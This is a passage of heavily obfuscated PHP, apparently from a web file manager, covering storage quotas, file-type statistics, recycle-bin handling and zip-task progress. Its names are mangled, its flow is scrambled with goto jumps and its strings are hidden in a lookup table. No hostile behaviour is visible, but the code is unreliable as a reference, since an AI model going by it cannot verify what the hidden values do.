$this->targetSpaceSize($DÃÜá„∫•˘, $E¶≠–ÙùÆó); if ($DÃÜá„∫•˘ == self::TYPE_USER) { Model($C∂€çπΩá†[495])->userEdit($E¶≠–ÙùÆó, array($C∂€çπΩá†[1693] => $Bà⁄ìç öÑ)); } else { if ($DÃÜá„∫•˘ == self::TYPE_GROUP) { Model($C∂€çπΩá†[504])->groupEdit($E¶≠–ÙùÆó, array($C∂€çπΩá†[1693] => $Bà⁄ìç öÑ)); } } } public function targetSpaceSize($a´òÒ‘é◊º, $EÈñı‚’Ù—) { goto dïÛ¿ÃËëè; b´°≠·àêü: $e‚íçìõ˜ı = !$e‚íçìõ˜ı || $e‚íçìõ˜ı <= 0 ? 0 : $e‚íçìõ˜ı; return $e‚íçìõ˜ı; goto d»ùÎ–ã»ü; E∂•‰ç«ûå: $aÎ§œìÍ∏Ç = array_to_keyvalue($aÎ§œìÍ∏Ç, $B¨û‚ú∑„˘[33], $B¨û‚ú∑„˘[396]); $aÎ§œìÍ∏Ç = array_unique(array_filter($aÎ§œìÍ∏Ç)); if ($aÎ§œìÍ∏Ç) { $eÜÍá≥Õ«‘ = array($B¨û‚ú∑„˘[411] => array($B¨û‚ú∑„˘[412], $aÎ§œìÍ∏Ç)); $e‚íçìõ˜ı += floatval($this->where($eÜÍá≥Õ«‘)->sum($B¨û‚ú∑„˘[78])); } goto b´°≠·àêü; dïÛ¿ÃËëè: $B¨û‚ú∑„˘ =& $_SERVER[Öíæ€“”≠éÏË]; $AÖ¬ß∫âæØ = $this->sourceRoot($a´òÒ‘é◊º, $EÈñı‚’Ù—, !0); if (!$AÖ¬ß∫âæØ) { return 0; } goto cà’ëâÚ•≠; cà’ëâÚ•≠: $e‚íçìõ˜ı = floatval($AÖ¬ß∫âæØ[$B¨û‚ú∑„˘[78]]); $eÜÍá≥Õ«‘ = array($B¨û‚ú∑„˘[567] => array($B¨û‚ú∑„˘[526], $B¨û‚ú∑„˘[513] . $AÖ¬ß∫âæØ[$B¨û‚ú∑„˘[396]] . $B¨û‚ú∑„˘[527])); $aÎ§œìÍ∏Ç = Model($B¨û‚ú∑„˘[422])->field($B¨û‚ú∑„˘[411])->where($eÜÍá≥Õ«‘)->select(); goto E∂•‰ç«ûå; d»ùÎ–ã»ü: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($eÜÆ†ê»Ó—) { return $this->fileTypeProfile($eÜÆ†ê»Ó—, SourceModel::TYPE_USER); } public function groupFileTypeProfile($c∑éŒÉ∂õÔ) { return $this->fileTypeProfile($c∑éŒÉ∂õÔ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($eÒ≥ÉÚØ∫≤, $f£⁄„…‹≤È) { goto AÃΩæ¥éÁÉ; f›Ãè≥âæ¥: if ($EÇï˜€à∞è) { return $EÇï˜€à∞è; } $aﬂ©Ï≠ç∫ = array($Dõ€—®ã É[560] => 0); if ($eÒ≥ÉÚØ∫≤ != !1) { $aﬂ©Ï≠ç∫[$Dõ€—®ã É[485]] = $eÒ≥ÉÚØ∫≤; $aﬂ©Ï≠ç∫[$Dõ€—®ã É[405]] = $f£⁄„…‹≤È; } goto bà´ﬂÎ≈‘¶; bà´ﬂÎ≈‘¶: $BïÏ∂∏†≥è = array(); $BïÏ∂∏†≥è[$Dõ€—®ã É[2004]] = array($Dõ€—®ã É[2005] => LNG($Dõ€—®ã É[2004]), $Dõ€—®ã É[2006] => $this->where($aﬂ©Ï≠ç∫)->count(), $Dõ€—®ã É[562] => $this->where($aﬂ©Ï≠ç∫)->sum($Dõ€—®ã É[78])); $B’€‡Ôì∑ò = KodIO::fileTypeList(); goto e÷€ÈÂÆÕ“; e÷€ÈÂÆÕ“: foreach ($B’€‡Ôì∑ò as $C¥‹ÒıπÏ⁄ => $eÍ›∫êÿÛó) { $aﬂ©Ï≠ç∫[$Dõ€—®ã É[406]] = $this->fileTypeWhere($C¥‹ÒıπÏ⁄); $BïÏ∂∏†≥è[$C¥‹ÒıπÏ⁄] = array($Dõ€—®ã É[2005] => $eÍ›∫êÿÛó[$Dõ€—®ã É[28]], $Dõ€—®ã É[2006] => $this->where($aﬂ©Ï≠ç∫)->count(), $Dõ€—®ã É[562] => $this->where($aﬂ©Ï≠ç∫)->sum($Dõ€—®ã É[78])); } Cache::set($d∏…Ëåü, $BïÏ∂∏†≥è, 1200); return $BïÏ∂∏†≥è; goto A·Ö¡íﬁ˜à; AÃΩæ¥éÁÉ: $Dõ€—®ã É =& $_SERVER[Öíæ€“”≠éÏË]; $d∏…Ëåü = $Dõ€—®ã É[2003] . $eÒ≥ÉÚØ∫≤ . $Dõ€—®ã É[71] . $f£⁄„…‹≤È; $EÇï˜€à∞è = Cache::get($d∏…Ëåü); goto f›Ãè≥âæ¥; A·Ö¡íﬁ˜à: } public function fileNameExist($f±Ò⁄≈å£é, $E¥€ã¬˘¬¥) { $BØºÖéâËå =& $_SERVER[Öíæ€“”≠éÏË]; $AÁÙ‚É∂ó⁄ = $this->where(array($BØºÖéâËå[479] => $f±Ò⁄≈å£é, $BØºÖéâËå[28] => $E¥€ã¬˘¬¥, $BØºÖéâËå[424] => 0))->find(); return is_array($AÁÙ‚É∂ó⁄) ? $AÁÙ‚É∂ó⁄[$BØºÖéâËå[396]] : !1; } public function childList($C®◊ÚàÒúË) { goto cŸ∏∏Éêè…; f»™ﬁÆê∆˘: self::$cacheChildList[$BÚüì“ÖÌè] = $dÀÜπ…€£¬; foreach ($dÀÜπ…€£¬ as $EÉ°ˆΩå™∆) { $BÚüì“ÖÌè = $EËÉŒ◊¥àÃ[439] . $EÉ°ˆΩå™∆[$EËÉŒ◊¥àÃ[396]]; self::$cacheSourceInfo[$BÚüì“ÖÌè] = $EÉ°ˆΩå™∆; } return $dÀÜπ…€£¬; goto bµÿÆåéﬂû; cŸ∏∏Éêè…: $EËÉŒ◊¥àÃ =& $_SERVER[Öíæ€“”≠éÏË]; $BÚüì“ÖÌè = $EËÉŒ◊¥àÃ[1981] . $C®◊ÚàÒúË; if (isset(self::$cacheChildList[$BÚüì“ÖÌè])) { return self::$cacheChildList[$BÚüì“ÖÌè]; } goto açˆø—‹†è; açˆø—‹†è: $C◊ß∆ÿŒ÷ô = array($EËÉŒ◊¥àÃ[479] => intval($C®◊ÚàÒúË), $EËÉŒ◊¥àÃ[424] => 0); $dÀÜπ…€£¬ = $this->where($C◊ß∆ÿŒ÷ô)->select(); $dÀÜπ…€£¬ = $dÀÜπ…€£¬ ? $dÀÜπ…€£¬ : array(); goto f»™ﬁÆê∆˘; bµÿÆåéﬂû: } public function fileNameAuto($D¡ˆÚç∫Œ’, $CÕÕçàØó«, $e‰›ó◊Çñ· = REPEAT_RENAME, $eœëÍÑÊøë = false) { $béÜ∑Ç‘Ãœ =& $_SERVER[Öíæ€“”≠éÏË]; $aüãõ¯Çêê = array($béÜ∑Ç‘Ãœ[479] => $D¡ˆÚç∫Œ’, $béÜ∑Ç‘Ãœ[424] => 0, $béÜ∑Ç‘Ãœ[28] => array($béÜ∑Ç‘Ãœ[380], $CÕÕçàØó« . $béÜ∑Ç‘Ãœ[381])); $c‡ÖÉç⁄∫± = $this->field($béÜ∑Ç‘Ãœ[28])->where($aüãõ¯Çêê)->select(); $A‡°ê÷ô‡ = array_to_keyvalue($c‡ÖÉç⁄∫±, $béÜ∑Ç‘Ãœ[33], $béÜ∑Ç‘Ãœ[28]); return $this->fileNameAutoGet($A‡°ê÷ô‡, $CÕÕçàØó«, $e‰›ó◊Çñ·, $eœëÍÑÊøë); } public function fileNameAutoGet($d‰çÆ¯ü∏⁄, $eä°‰Ñ®ç∫, $cÛÃ∆ñ£ﬂ¬, $cÊ—èÂıÃ˘) { $B⁄„Ÿ–ƒÖ¥ =& $_SERVER[Öíæ€“”≠éÏË]; if ($cÛÃ∆ñ£ﬂ¬ == REPEAT_REPLACE || !$d‰çÆ¯ü∏⁄ || !in_array_not_case($eä°‰Ñ®ç∫, $d‰çÆ¯ü∏⁄) || $cÊ—èÂıÃ˘ && $cÛÃ∆ñ£ﬂ¬ != REPEAT_RENAME_FOLDER) { return $eä°‰Ñ®ç∫; } if ($cÛÃ∆ñ£ﬂ¬ == REPEAT_SKIP) { return !1; } $B†•≤›ó˘ä = $B⁄„Ÿ–ƒÖ¥[95] . get_path_ext($eä°‰Ñ®ç∫); $B†•≤›ó˘ä = $B†•≤›ó˘ä == $B⁄„Ÿ–ƒÖ¥[95] || $cÊ—èÂıÃ˘ ? $B⁄„Ÿ–ƒÖ¥[33] : $B†•≤›ó˘ä; for ($bÑÈûà⁄∫â = 1; $bÑÈûà⁄∫â <= count($d‰çÆ¯ü∏⁄) + 1; $bÑÈûà⁄∫â++) { $AﬂÀâ¶¢àÍ = substr($eä°‰Ñ®ç∫, 0, strlen($eä°‰Ñ®ç∫) - strlen($B†•≤›ó˘ä)); $f∫±Ïπ˘ñò = $AﬂÀâ¶¢àÍ . "\x28{$bÑÈûà⁄∫â}\x29{$B†•≤›ó˘ä}"; if (!in_array_not_case($f∫±Ïπ˘ñò, $d‰çÆ¯ü∏⁄)) { return $f∫±Ïπ˘ñò; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\145\x5f\x72\145\x63\171\143\154\145"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\163\145\x72\164", "\x66\165\156\x63\x74\x69\x6f\x6e")); public function listData($fÓùœÑ”ÜÚ = false) { $eå¿Àˆ—ÈË =& $_SERVER[Öíæ€“”≠éÏË]; $fÓùœÑ”ÜÚ = $fÓùœÑ”ÜÚ ? $fÓùœÑ”ÜÚ : USER_ID; $CÌ≥≠‹ãûê = $this->where(array($eå¿Àˆ—ÈË[1529] => $fÓùœÑ”ÜÚ))->select(); return array_to_keyvalue($CÌ≥≠‹ãûê, $eå¿Àˆ—ÈË[33], $eå¿Àˆ—ÈË[396]); } public function moveToRecycle($fÕ•Ôﬁûæï) { goto d»ı†©÷√÷; C⁄ü‡ïÖâ‰: $this->recycleMove($fÕ•Ôﬁûæï, 1); if ($Aàâ¨®ıÿ∏[$dÇí≠åØë”[404]] == $dÇí≠åØë”[87]) { $fπòõâ∆ÊÃ = array($dÇí≠åØë”[567] => array($dÇí≠åØë”[526], $Aàâ¨®ıÿ∏[$dÇí≠åØë”[503]] . $fÕ•Ôﬁûæï . $dÇí≠åØë”[527])); $FÖﬁÖ¶“≥ò->where($fπòõâ∆ÊÃ)->setField($dÇí≠åØë”[424], 1); } goto aıæÉ»ùç; d»ı†©÷√÷: $dÇí≠åØë” =& $_SERVER[Öíæ€“”≠éÏË]; $FÖﬁÖ¶“≥ò = Model($dÇí≠åØë”[1215]); $Aàâ¨®ıÿ∏ = $FÖﬁÖ¶“≥ò->sourceInfo($fÕ•Ôﬁûæï); goto Cûä≠ìó’Ò; Cûä≠ìó’Ò: if (!$Aàâ¨®ıÿ∏ || $Aàâ¨®ıÿ∏[$dÇí≠åØë”[424]] == $dÇí≠åØë”[87]) { return; } $A˘Æ”Æ¬Úø = array($dÇí≠åØë”[411] => $fÕ•Ôﬁûæï, $dÇí≠åØë”[1529] => USER_ID, $dÇí≠åØë”[563] => $Aàâ¨®ıÿ∏[$dÇí≠åØë”[405]], $dÇí≠åØë”[564] => $Aàâ¨®ıÿ∏[$dÇí≠åØë”[485]], $dÇí≠åØë”[567] => $Aàâ¨®ıÿ∏[$dÇí≠åØë”[503]]); $this->add($A˘Æ”Æ¬Úø); goto C⁄ü‡ïÖâ‰; aıæÉ»ùç: } public function clear() { $this->remove(!1); } public function remove($fΩÆÑÇëÁê = false, $Cë±ëœÕ⁄Ë = false) { goto bÕòÍŒ∆©±; eõŒ‹∑˜Ê∏: foreach ($c∫ı¶ ©ÃÀ as $a¿ﬂòÂÜ≈È) { if ($fΩÆÑÇëÁê != !1 && !in_array($a¿ﬂòÂÜ≈È, $fΩÆÑÇëÁê)) { continue; } $A∫•ïæëà€ = $bò¯æó¯Ü«->sourceInfo($a¿ﬂòÂÜ≈È); $bò¯æó¯Ü«->remove($a¿ﬂòÂÜ≈È, !1); $a¨¨ÎíÊÊ∂ = $A∫•ïæëà€[$cñã–÷≥áª[405]] . $cñã–÷≥áª[71] . $A∫•ïæëà€[$cñã–÷≥áª[485]]; $B•ÑÉÔ“çï[$a¨¨ÎíÊÊ∂] = array($cñã–÷≥áª[563] => $A∫•ïæëà€[$cñã–÷≥áª[405]], $cñã–÷≥áª[485] => $A∫•ïæëà€[$cñã–÷≥áª[485]]); $this->where(array($cñã–÷≥áª[396] => $a¿ﬂòÂÜ≈È))->delete(); } foreach ($B•ÑÉÔ“çï as $DÒÇ‚Ò› ò) { $bò¯æó¯Ü«->targetSpaceUpdate($DÒÇ‚Ò› ò[$cñã–÷≥áª[405]], $DÒÇ‚Ò› ò[$cñã–÷≥áª[485]]); } goto fﬁòŸúπ¨ß; aåû ´≈¬≈: $c∫ı¶ ©ÃÀ = $this->listData($Cë±ëœÕ⁄Ë); $fΩÆÑÇëÁê = $fΩÆÑÇëÁê === !1 ? !1 : $fΩÆÑÇëÁê; $B•ÑÉÔ“çï = array(); goto eõŒ‹∑˜Ê∏; bÕòÍŒ∆©±: $cñã–÷≥áª =& $_SERVER[Öíæ€“”≠éÏË]; $Cë±ëœÕ⁄Ë = $Cë±ëœÕ⁄Ë ? $Cë±ëœÕ⁄Ë : USER_ID; $bò¯æó¯Ü« = Model($cñã–÷≥áª[1215]); goto aåû ´≈¬≈; fﬁòŸúπ¨ß: } public function restore($f•∞çΩ€¯ê = false) { $F¨‘íƒ°ûÒ = $this->listData(); $this->_restoreSource($F¨‘íƒ°ûÒ, $f•∞çΩ€¯ê); } public function removeUserAll($c™∑ƒ£ò∆‡) { $this->remove(!1, $c™∑ƒ£ò∆‡); } private function _restoreSource($E≥≥ΩåìŒ«, $BÖéª∞”¶è) { goto C«¿‰»Æ∫; C«¿‰»Æ∫: $e¯∑ßÍ‡Íà =& $_SERVER[Öíæ€“”≠éÏË]; $dÀÖøä˜™Ω = Model($e¯∑ßÍ‡Íà[1215]); $BÖéª∞”¶è = $BÖéª∞”¶è == !1 ? !1 : $BÖéª∞”¶è; goto F°´ìÊû©Ç; F°´ìÊû©Ç: if (!$E≥≥ΩåìŒ«) { return !0; } $Bû¿»ø⁄è¡ = array(); foreach ($E≥≥ΩåìŒ« as $c∆öñßº≤ﬂ) { goto c£Ìƒêœó¿; c£Ìƒêœó¿: if ($BÖéª∞”¶è != !1 && !in_array($c∆öñßº≤ﬂ, $BÖéª∞”¶è)) { continue; } $Dª©«êË“ı = $dÀÖøä˜™Ω->sourceInfo($c∆öñßº≤ﬂ); $Fç»ÓÇäÚÇ = $dÀÖøä˜™Ω->sourceInfo($Dª©«êË“ı[$e¯∑ßÍ‡Íà[479]]); goto A©´ãíÎªä; A©´ãíÎªä: if ($Fç»ÓÇäÚÇ[$e¯∑ßÍ‡Íà[424]] == $e¯∑ßÍ‡Íà[87]) { continue; } $dÀÖøä˜™Ω->lockMoveStart($c∆öñßº≤ﬂ); $this->recycleMove($c∆öñßº≤ﬂ, 0); goto eÇÕæñŒ»Ô; eÇÕæñŒ»Ô: if ($Dª©«êË“ı[$e¯∑ßÍ‡Íà[404]] == $e¯∑ßÍ‡Íà[87]) { $D‰¥Ω⁄Üıµ = array($e¯∑ßÍ‡Íà[567] => array($e¯∑ßÍ‡Íà[526], $Dª©«êË“ı[$e¯∑ßÍ‡Íà[503]] . $c∆öñßº≤ﬂ . $e¯∑ßÍ‡Íà[527])); $dÀÖøä˜™Ω->where($D‰¥Ω⁄Üıµ)->setField($e¯∑ßÍ‡Íà[424], 0); $this->restoreFolderChildren($c∆öñßº≤ﬂ, $E≥≥ΩåìŒ«); } $this->where(array($e¯∑ßÍ‡Íà[396] => $c∆öñßº≤ﬂ))->delete(); $dÀÖøä˜™Ω->folderSizeReset($Dª©«êË“ı[$e¯∑ßÍ‡Íà[479]]); goto DâÖ≥˘«√; DâÖ≥˘«√: $Bû¿»ø⁄è¡[] = $Dª©«êË“ı[$e¯∑ßÍ‡Íà[479]]; if ($Dª©«êË“ı[$e¯∑ßÍ‡Íà[404]] == $e¯∑ßÍ‡Íà[87]) { $Bû¿»ø⁄è¡[] = $c∆öñßº≤ﬂ; } $dÀÖøä˜™Ω->lockMoveEnd($c∆öñßº≤ﬂ); goto aÜ·µÆ≈ôÏ; aÜ·µÆ≈ôÏ: } goto Dÿìòíê∂§; Dÿìòíê∂§: $dÀÖøä˜™Ω->updateModifyTime($Bû¿»ø⁄è¡); goto E Óó∫ûàﬂ; E Óó∫ûàﬂ: } private function restoreFolderChildren($e®´åôﬁ›¨, $cﬂπàã—Â«) { goto DïŸ¿ äØ; DïŸ¿ äØ: $D¨Ø¥“…Àó =& $_SERVER[Öíæ€“”≠éÏË]; $c •ïÑÜ√á = Model($D¨Ø¥“…Àó[1215]); $BÂπê‚øŒ = array($D¨Ø¥“…Àó[396] => array($D¨Ø¥“…Àó[7], array())); goto fÓÌø¡âøô; EÇå¬Â¬áø: $BÂπê‚øŒ[$D¨Ø¥“…Àó[396]][1] = array_unique($BÂπê‚øŒ[$D¨Ø¥“…Àó[396]][1]); $BÂπê‚øŒ[$D¨Ø¥“…Àó[968]] = $D¨Ø¥“…Àó[1799]; $c •ïÑÜ√á->where($BÂπê‚øŒ)->setField($D¨Ø¥“…Àó[424], 1); goto BúºÆ£Í›À; fÓÌø¡âøô: foreach ($cﬂπàã—Â« as $c·ïÖ¬ê◊≥) { if ($c·ïÖ¬ê◊≥ == $e®´åôﬁ›¨) { continue; } if (!$c •ïÑÜ√á->isParentOf($e®´åôﬁ›¨, $c·ïÖ¬ê◊≥)) { continue; } $e∆ÂÔîéãã = $c •ïÑÜ√á->sourceInfo($c·ïÖ¬ê◊≥); if ($e∆ÂÔîéãã[$D¨Ø¥“…Àó[404]] == $D¨Ø¥“…Àó[87]) { $BÂπê‚øŒ[] = array($D¨Ø¥“…Àó[567] => array($D¨Ø¥“…Àó[526], $e∆ÂÔîéãã[$D¨Ø¥“…Àó[503]] . $c·ïÖ¬ê◊≥ . $D¨Ø¥“…Àó[527])); } else { $BÂπê‚øŒ[$D¨Ø¥“…Àó[396]][1][] = $c·ïÖ¬ê◊≥; } } if (!$BÂπê‚øŒ[$D¨Ø¥“…Àó[396]][1]) { unset($BÂπê‚øŒ[$D¨Ø¥“…Àó[396]]); } if (!$BÂπê‚øŒ) { return; } goto EÇå¬Â¬áø; BúºÆ£Í›À: } private function recycleMove($f¡µÒçêãë, $aÛ®çà≈πã = 1) { $C‡´≥äÇ¢– =& $_SERVER[Öíæ€“”≠éÏË]; $FÊ¥ªÕÑÌç = Model($C‡´≥äÇ¢–[1215]); $Fáû›À¶∑Ñ = Model($C‡´≥äÇ¢–[2007]); $A™›üó´¯ñ = array($C‡´≥äÇ¢–[396] => $f¡µÒçêãë); if ($aÛ®çà≈πã) { $FÊ¥ªÕÑÌç->where($A™›üó´¯ñ)->setField($C‡´≥äÇ¢–[424], 1); $Fáû›À¶∑Ñ->eventRecycle($f¡µÒçêãë, $C‡´≥äÇ¢–[2008]); } else { $A≠ä¿±øØú = $FÊ¥ªÕÑÌç->where($A™›üó´¯ñ)->find(); $Då¬ºä›µú = $A≠ä¿±øØú[$C‡´≥äÇ¢–[404]] == $C‡´≥äÇ¢–[87]; $fóû„í≥£€ = $FÊ¥ªÕÑÌç->fileNameAuto($A≠ä¿±øØú[$C‡´≥äÇ¢–[479]], $A≠ä¿±øØú[$C‡´≥äÇ¢–[28]], REPEAT_RENAME_FOLDER, $Då¬ºä›µú); if ($fóû„í≥£€ != $A≠ä¿±øØú[$C‡´≥äÇ¢–[28]]) { $FÊ¥ªÕÑÌç->rename($f¡µÒçêãë, $fóû„í≥£€); } $FÊ¥ªÕÑÌç->where($A™›üó´¯ñ)->setField($C‡´≥äÇ¢–[424], 0); $Fáû›À¶∑Ñ->eventRecycle($f¡µÒçêãë, $C‡´≥äÇ¢–[2009]); } } } goto b›úôÜ∏√é; A¿◊‚°úˆè: class TaskZip extends TaskFileTransfer { protected function startAfter() { $c¯ùñ≠Ùû¬ =& $_SERVER[Öíæ€“”≠éÏË]; parent::startAfter(); Hook::bind($c¯ùñ≠Ùû¬[1631], array($this, $c¯ùñ≠Ùû¬[1626])); $b◊∞Í‚»Ñ™ =& $this->task; $b◊∞Í‚»Ñ™[$c¯ùñ≠Ùû¬[1628]] = $c¯ùñ≠Ùû¬[1103]; if (!$b◊∞Í‚»Ñ™[$c¯ùñ≠Ùû¬[1441]]) { $b◊∞Í‚»Ñ™[$c¯ùñ≠Ùû¬[1441]] = LNG($c¯ùñ≠Ùû¬[1632]); } } protected function endAfter() { $D∑åàÖ©∏ã =& $_SERVER[Öíæ€“”≠éÏË]; parent::endAfter(); Hook::unbind($D∑åàÖ©∏ã[1631], array($this, $D∑åàÖ©∏ã[1626])); } public function updateAfter() { $F’ä®Ôßü‡ =& $_SERVER[Öíæ€“”≠éÏË]; $fëïàÈ‹ïÓ =& $this->task; if (!$fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1031]] || !$fëïàÈ‹ïÓ[$F’ä®Ôßü‡[736]]) { return; } if ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1628]] == $F’ä®Ôßü‡[1103]) { $eõûÌ‚âÛø = $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1585]]; if ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1586]] != $F’ä®Ôßü‡[1103]) { $eõûÌ‚âÛø = 0; } $EˆÉïÖâÜΩ = ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1589]] + $eõûÌ‚âÛø) / $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[736]]; $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1539]] = $EˆÉïÖâÜΩ * 0.3; } else { if ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1628]] == $F’ä®Ôßü‡[311]) { $EˆÉïÖâÜΩ = $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1045]] / $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1031]]; $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1539]] = 0.3 + $EˆÉïÖâÜΩ * 0.5; } else { if ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1628]] == $F’ä®Ôßü‡[107]) { $EˆÉïÖâÜΩ = 0; if ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1584]]) { $EˆÉïÖâÜΩ = $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1585]] / $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1584]]; } $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1539]] = 0.3 + 0.5 + $EˆÉïÖâÜΩ * 0.2; } } } if ($fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1539]] > 0) { $D§ƒ∏ã‘¢Ó = timeFloat() - $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[762]] - $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1542]]; $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1543]] = $D§ƒ∏ã‘¢Ó * (1 - $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1539]]) / $fëïàÈ‹ïÓ[$F’ä®Ôßü‡[1539]]; } } public function copyFileStart($F˘ø≤ΩÓ»ê, $DÜ¯õËòª•, $cñÒ¡Õì å, $c˜ùïà⁄õœ, $aé—´ù∏ı¥, $aÕ´ñÇ∂ö∑) { $d◊†Öı≤ù˘ =& $_SERVER[Öíæ€“”≠éÏË]; parent::copyFileStart($F˘ø≤ΩÓ»ê, $DÜ¯õËòª•, $cñÒ¡Õì å, $c˜ùïà⁄õœ, $aé—´ù∏ı¥, $aÕ´ñÇ∂ö∑); $Cû±»„‚ƒ¡ =& $this->task; if ($Cû±»„‚ƒ¡[$d◊†Öı≤ù˘[1628]] == $d◊†Öı≤ù˘[311]) { $Cû±»„‚ƒ¡[$d◊†Öı≤ù˘[1628]] = $d◊†Öı≤ù˘[107]; } $this->update(); } public function copyFileEnd($a¨»É…œçò, $Cã∞™ƒü‰ƒ, $CãÙﬂ¢„€ä, $DØß≠‡•€æ, $cà§Éá≠ää, $f¯ÃÃáÑñ∫) { $a‡Û¿º‘ﬁÖ =& $_SERVER[Öíæ€“”≠éÏË]; $dåùæ⁄ô¢æ =& $this->task; $dåùæ⁄ô¢æ[$a‡Û¿º‘ﬁÖ[1585]] = $dåùæ⁄ô¢æ[$a‡Û¿º‘ﬁÖ[1584]]; $dåùæ⁄ô¢æ[$a‡Û¿º‘ﬁÖ[1589]] += $dåùæ⁄ô¢æ[$a‡Û¿º‘ﬁÖ[1584]]; $dåùæ⁄ô¢æ[$a‡Û¿º‘ﬁÖ[1586]] = $a‡Û¿º‘ﬁÖ[33]; $this->update(); } public function nameParse($Bõ«¡¢ô÷À) { $B¬⁄íôŒÀÚ =& $_SERVER[Öíæ€“”≠éÏË]; $B€°—£àœ =& $this->task; if ($B€°—£àœ[$B¬⁄íôŒÀÚ[1045]] < $B€°—£àœ[$B¬⁄íôŒÀÚ[1031]]) { $fÖùµ®∂ôê = get_path_this($Bõ«¡¢ô÷À); if (strstr($fÖùµ®∂ôê, $B¬⁄íôŒÀÚ[95])) { $B€°—£àœ[$B¬⁄íôŒÀÚ[1045]] += 1; } } if ($B€°—£àœ[$B¬⁄íôŒÀÚ[1628]] == $B¬⁄íôŒÀÚ[1103]) { $B€°—£àœ[$B¬⁄íôŒÀÚ[1628]] = $B¬⁄íôŒÀÚ[311]; } $B€°—£àœ[$B¬⁄íôŒÀÚ[1582]] = $Bõ«¡¢ô÷À; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($BËë€ÑÉ•ô) { $eÀÂø≥Ÿ„¡ =& $_SERVER[Öíæ€“”≠éÏË]; $aÂÜ‘‡ûÖÏ = array($eÀÂø≥Ÿ„¡[576] => array($eÀÂø≥Ÿ„¡[29] => $eÀÂø≥Ÿ„¡[1633], $eÀÂø≥Ÿ„¡[271] => array($eÀÂø≥Ÿ„¡[222], $eÀÂø≥Ÿ„¡[738], $eÀÂø≥Ÿ„¡[1634], $eÀÂø≥Ÿ„¡[1635])), $eÀÂø≥Ÿ„¡[1636] => array($eÀÂø≥Ÿ„¡[29] => $eÀÂø≥Ÿ„¡[1637], $eÀÂø≥Ÿ„¡[271] => array($eÀÂø≥Ÿ„¡[222], $eÀÂø≥Ÿ„¡[736], $eÀÂø≥Ÿ„¡[1638], $eÀÂø≥Ÿ„¡[1639], $eÀÂø≥Ÿ„¡[1640]))); if (!isset($aÂÜ‘‡ûÖÏ[$BËë€ÑÉ•ô])) { return !1; } $this->optionType = $aÂÜ‘‡ûÖÏ[$BËë€ÑÉ•ô][$eÀÂø≥Ÿ„¡[29]]; $this->field = $aÂÜ‘‡ûÖÏ[$BËë€ÑÉ•ô][$eÀÂø≥Ÿ„¡[271]]; return !0; } public function listData($DÆæ—Ñ¶Ã± = false, $E±ﬁ¥ î∂ª = "\x6d\x6f\x64\x69\146\171\x54\151\x6d\145", $F¨ÆÉ†Ô…Ë = false) { return parent::listData($DÆæ—Ñ¶Ã±, $E±ﬁ¥ î∂ª, $F¨ÆÉ†Ô…Ë); } public function trendList($a—íà≈Œ¥ı) { goto b∏ÍïÎ©å…; b∏ÍïÎ©å…: $aóùÇ∞£÷ƒ =& $_SERVER[Öíæ€“”≠éÏË]; $Fëœ∏íÆ◊Ù = $this->listData(); if ($Fëœ∏íÆ◊Ù) { $eÒâÖËŒ±∞ = end($Fëœ∏íÆ◊Ù); $F©©ÕÇŸ•Ì = date($aóùÇ∞£÷ƒ[1641], strtotime($aóùÇ∞£÷ƒ[1642])); if ($eÒâÖËŒ±∞[$aóùÇ∞£÷ƒ[222]] == $F©©ÕÇŸ•Ì) { return $Fëœ∏íÆ◊Ù; } $aÏÒµ∑Û∞ä = strtotime($eÒâÖËŒ±∞[$aóùÇ∞£÷ƒ[222]]); } goto a€ÌΩ“ßÙ≥; a€ÌΩ“ßÙ≥: if (!isset($aÏÒµ∑Û∞ä)) { $e¬Û∆⁄€√Â = $a—íà≈Œ¥ı == $aóùÇ∞£÷ƒ[576] ? $aóùÇ∞£÷ƒ[520] : $aóùÇ∞£÷ƒ[803]; $aÏÒµ∑Û∞ä = Model($e¬Û∆⁄€√Â)->min($aóùÇ∞£÷ƒ[194]); } $f∆ÆÀãòı = $aóùÇ∞£÷ƒ[1643] . ucfirst($a—íà≈Œ¥ı); $dºäÃÉıºÈ = $this->dateList($aÏÒµ∑Û∞ä); goto bã‡•àäˆ¥; bã‡•àäˆ¥: foreach ($dºäÃÉıºÈ as $F©©ÕÇŸ•Ì) { $this->{$f∆ÆÀãòı}($F©©ÕÇŸ•Ì); } return $this->listData(); goto E‚«ãﬂË¡; E‚«ãﬂË¡: } private function dateList($c«éœá◊Ÿ°) { $AÇã¶˜¬Ç≥ =& $_SERVER[Öíæ€“”≠éÏË]; $c»íË°ôéƒ = $c«éœá◊Ÿ°; $bÖÖ⁄¨Ÿ„Ì = strtotime($AÇã¶˜¬Ç≥[1642]); $fÑàÇÉêÔë = array(); while ($c»íË°ôéƒ <= $bÖÖ⁄¨Ÿ„Ì) { $fÑàÇÉêÔë[] = date($AÇã¶˜¬Ç≥[1641], $c»íË°ôéƒ); $c»íË°ôéƒ = strtotime($AÇã¶˜¬Ç≥[1644], $c»íË°ôéƒ); } return $fÑàÇÉêÔë; } public function _recordUser($C§≠á¥º≤Ê = '') { goto DÎáÉ…¬π∆; DÎáÉ…¬π∆: $E‘ÏéÙæäÊ =& 